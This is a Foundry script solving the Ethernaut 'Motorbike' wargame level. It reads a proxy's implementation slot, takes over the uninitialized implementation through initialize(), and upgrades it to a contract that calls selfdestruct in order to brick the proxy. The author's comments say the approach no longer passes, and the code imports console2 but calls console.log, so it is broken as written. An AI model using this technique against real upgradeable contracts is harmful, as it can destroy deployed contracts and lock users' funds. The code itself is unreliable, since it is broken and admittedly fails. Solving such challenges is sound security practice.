// SPDX-License-Identifier: MIT

pragma solidity <0.7.0;

import {Script} from "forge-std/Script.sol";
import {console2} from "forge-std/console2.sol";
import {Motorbike, Engine} from "../../src/level-25/EthernautMotorBike.sol";

contract MotorBikeSolution is Script {
    Motorbike proxy = Motorbike(0x044d0e53A7103912F428C65AbD685D6f14e56814);
    Engine implementation =
        Engine(
            address(
                uint160(
                    uint256(
                        vm.load(
                            address(proxy),
                            0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc
                        )
                    )
                )
            )
        );
    // MotorBikeRevert attacker;
    MotorBikeDestruct attacker;

    function run() external {
        address myAddress = vm.envAddress("MY_ADDRESS");
        vm.startBroadcast(vm.envUint("PRIVATE_KEY"));
        attacker = new MotorBikeDestruct();

        if (implementation.upgrader() != myAddress) {
            implementation.initialize();
        }
        console.log("Upgrader is :", implementation.upgrader());
        // implementation.upgradeToAndCall(address(attacker), "");
        /**
         * @title ?????
         * @author Rionaldi
         * @notice Call below should selfdestruct the new implementation and make the proxy unusable. But the challenge at ethernaut doesn't pass???
         */
        implementation.upgradeToAndCall(
            address(attacker),
            abi.encodeWithSignature("attack()")
        );
        address(proxy).call(abi.encodeWithSignature("initialize()"));

        vm.stopBroadcast();
    }
}

/**
 * @notice below solution doesn't work anymore. The challenge not passed with selfdestruct
 */
contract MotorBikeDestruct {
    function attack() external {
        selfdestruct(address(0));
    }
}

// contract MotorBikeRevert {
//     function initialize() public pure {
//         revert("Bricked!");
//     }

//     function upgradeToAndCall(address, bytes memory) public pure {
//         revert("Bricked!");
//     }

//     fallback() external payable {
//         revert("Bricked!");
//     }

//     receive() external payable {
//         revert("Bricked!");
//     }
// }
